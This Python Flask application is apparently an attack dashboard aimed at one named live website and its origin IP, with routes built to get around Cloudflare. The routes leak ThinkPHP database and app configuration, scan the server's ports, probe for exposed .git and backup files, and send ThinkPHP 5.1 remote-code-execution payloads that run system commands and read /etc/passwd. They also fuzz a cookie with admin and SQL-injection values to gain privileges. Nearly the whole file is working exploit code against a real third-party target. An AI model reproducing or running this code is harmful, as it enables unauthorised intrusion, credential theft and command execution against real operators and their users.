from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
import base64
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__, static_folder='.')
CORS(app)

TARGET = "https://goldmedal.cc"
TARGET_IP = "http://31.59.114.216"  # Direct IP (bypass CF)

# Serve HTML
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# ============ PROXY (unchanged) ============
@app.route('/proxy', methods=['GET', 'POST'])
def proxy():
    path = request.args.get('path', '/')
    url = f"{TARGET}/{path.lstrip('/')}"
    headers = dict(request.headers)
    headers.pop('Host', None)
    
    cookies = {}
    if 'custom_cookie' in request.args:
        encoded = base64.b64encode(request.args['custom_cookie'].encode()).decode()
        cookies['username'] = encoded
    
    try:
        if request.method == 'GET':
            resp = requests.get(url, headers=headers, cookies=cookies, 
                              allow_redirects=False, verify=False, timeout=15)
        else:
            resp = requests.post(url, headers=headers, cookies=cookies,
                               data=request.get_data(), allow_redirects=False,
                               verify=False, timeout=15)
        return jsonify({
            'url': url,
            'status_code': resp.status_code,
            'headers': dict(resp.headers),
            'body': resp.text[:8000],
            'length': len(resp.text)
        })
    except Exception as e:
        return jsonify({'error': str(e), 'url': url}), 500

# ============ NEW: ThinkPHP Config Leak ============
@app.route('/hunt/thinkphp-config')
def thinkphp_config():
    """Try to leak config files"""
    payloads = [
        '/index.php?s=index/think\\config/get&name=database',
        '/index.php?s=index/think\\config/get&name=database.hostname',
        '/index.php?s=index/think\\config/get&name=database.username',
        '/index.php?s=index/think\\config/get&name=database.password',
        '/index.php?s=index/think\\config/get&name=database.database',
        '/index.php?s=index/think\\config/get&name=database.hostport',
        '/index.php?s=index/think\\config/get&name=app',
        '/index.php?s=index/think\\config/get&name=cache',
        '/index.php?s=index/think\\config/get&name=session',
        '/index.php?s=index/think\\config/get&name=cookie',
    ]
    results = []
    for p in payloads:
        try:
            r = requests.get(f"{TARGET}{p}", timeout=10, verify=False, 
                           headers={'User-Agent': 'Mozilla/5.0'})
            results.append({
                'payload': p,
                'status': r.status_code,
                'length': len(r.text),
                'snippet': r.text[:1000]
            })
        except Exception as e:
            results.append({'payload': p, 'error': str(e)})
    return jsonify(results)

# ============ NEW: Direct IP Testing (Bypass Cloudflare) ============
@app.route('/hunt/direct-ip/<port>')
def test_direct_port(port):
    """Test ports on the real server IP"""
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    result = sock.connect_ex(('31.59.114.216', int(port)))
    sock.close()
    return jsonify({
        'ip': '31.59.114.216',
        'port': int(port),
        'open': result == 0
    })

@app.route('/hunt/scan-common-ports')
def scan_common_ports():
    """Scan common BT Panel / server ports"""
    ports = [21, 22, 80, 443, 888, 8888, 3306, 6379, 8080, 8443, 9090]
    results = []
    import socket
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(('31.59.114.216', port))
        sock.close()
        results.append({'port': port, 'open': result == 0})
    return jsonify(results)

# ============ NEW: .git Leak Detection ============
@app.route('/hunt/git-leak')
def git_leak():
    """Check if .git is exposed"""
    paths = [
        '/.git/HEAD',
        '/.git/config',
        '/.git/index',
        '/.git/refs/heads/master',
        '/.git/logs/HEAD',
    ]
    results = []
    for p in paths:
        try:
            r = requests.get(f"{TARGET}{p}", timeout=10, verify=False)
            results.append({
                'path': p,
                'status': r.status_code,
                'length': len(r.text),
                'content': r.text[:500] if r.status_code == 200 else None
            })
        except Exception as e:
            results.append({'path': p, 'error': str(e)})
    return jsonify(results)

# ============ NEW: Backup File Finder ============
@app.route('/hunt/backup-files')
def backup_files():
    """Brute-force common backup file names"""
    backups = [
        'backup.zip', 'backup.tar.gz', 'backup.rar',
        'www.zip', 'www.tar.gz', 'web.zip',
        'invest307.fa.zip', 'goldmedal.zip',
        'backup.sql', 'database.sql', 'dump.sql',
        '.env', '.env.backup', '.env.production',
        'config.php.bak', 'config.php.old',
        'admin.php.bak', 'index.php.bak',
    ]
    results = []
    for b in backups:
        try:
            r = requests.get(f"{TARGET}/{b}", timeout=10, verify=False,
                           headers={'User-Agent': 'Mozilla/5.0'})
            results.append({
                'file': f'/{b}',
                'status': r.status_code,
                'length': len(r.text) if r.status_code == 200 else 0,
                'content_type': r.headers.get('Content-Type', 'unknown')
            })
        except Exception as e:
            results.append({'file': f'/{b}', 'error': str(e)})
    return jsonify(results)

# ============ NEW: BT Panel Check ============
@app.route('/hunt/bt-panel')
def bt_panel_check():
    """Check if BT Panel is accessible on common ports"""
    results = []
    # Check via direct IP
    for port in [8888, 888, 443, 80]:
        try:
            r = requests.get(f"http://31.59.114.216:{port}", timeout=5, 
                           verify=False, allow_redirects=True)
            results.append({
                'url': f'http://31.59.114.216:{port}',
                'status': r.status_code,
                'title': r.text[:200] if r.status_code == 200 else None,
                'has_bt_keyword': 'bt' in r.text.lower() or 'baota' in r.text.lower()
            })
        except Exception as e:
            results.append({'url': f'http://31.59.114.216:{port}', 'error': str(e)})
    
    # Check via domain
    for port in [8888, 888]:
        try:
            r = requests.get(f"https://goldmedal.cc:{port}", timeout=5, verify=False)
            results.append({
                'url': f'https://goldmedal.cc:{port}',
                'status': r.status_code,
                'title': r.text[:200] if r.status_code == 200 else None
            })
        except:
            pass
    
    return jsonify(results)

# ============ NEW: Full RCE Payloads ============
@app.route('/hunt/rce-payloads')
def rce_payloads():
    """Test known ThinkPHP 5.1 RCE payloads"""
    payloads = [
        # PHP Info
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
        # System command whoami
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
        # System command ls
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20-la',
        # System command pwd
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=pwd',
        # File read /etc/passwd
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/etc/passwd',
        # Directory listing
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/www/wwwroot/',
    ]
    results = []
    for p in payloads:
        try:
            r = requests.get(f"{TARGET}{p}", timeout=15, verify=False,
                           headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            results.append({
                'payload': p,
                'status': r.status_code,
                'length': len(r.text),
                'snippet': r.text[:2000]
            })
        except Exception as e:
            results.append({'payload': p, 'error': str(e)})
    return jsonify(results)

# ============ NEW: Cookie Fuzzing ============
@app.route('/hunt/cookie-fuzz')
def cookie_fuzz():
    """Try different cookie values to find privilege escalation"""
    values = [
        'admin', 'root', 'administrator', '1', 'true',
        '{"role":"admin"}', '{"id":1}', '{"user":"admin"}',
        'Marufbelay', '', 'guest', 'test',
        'or 1=1', "' or '1'='1",
    ]
    results = []
    for val in values:
        encoded = base64.b64encode(val.encode()).decode()
        try:
            r = requests.get(f"{TARGET}/index.php", 
                           cookies={'username': encoded},
                           timeout=10, verify=False)
            # Check if response differs from baseline
            is_different = 'module not exists' not in r.text.lower()
            has_error = 'HttpException' not in r.text
            results.append({
                'value': val,
                'encoded': encoded,
                'status': r.status_code,
                'length': len(r.text),
                'potential_impact': is_different and has_error
            })
        except Exception as e:
            results.append({'value': val, 'error': str(e)})
    return jsonify(results)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=True)
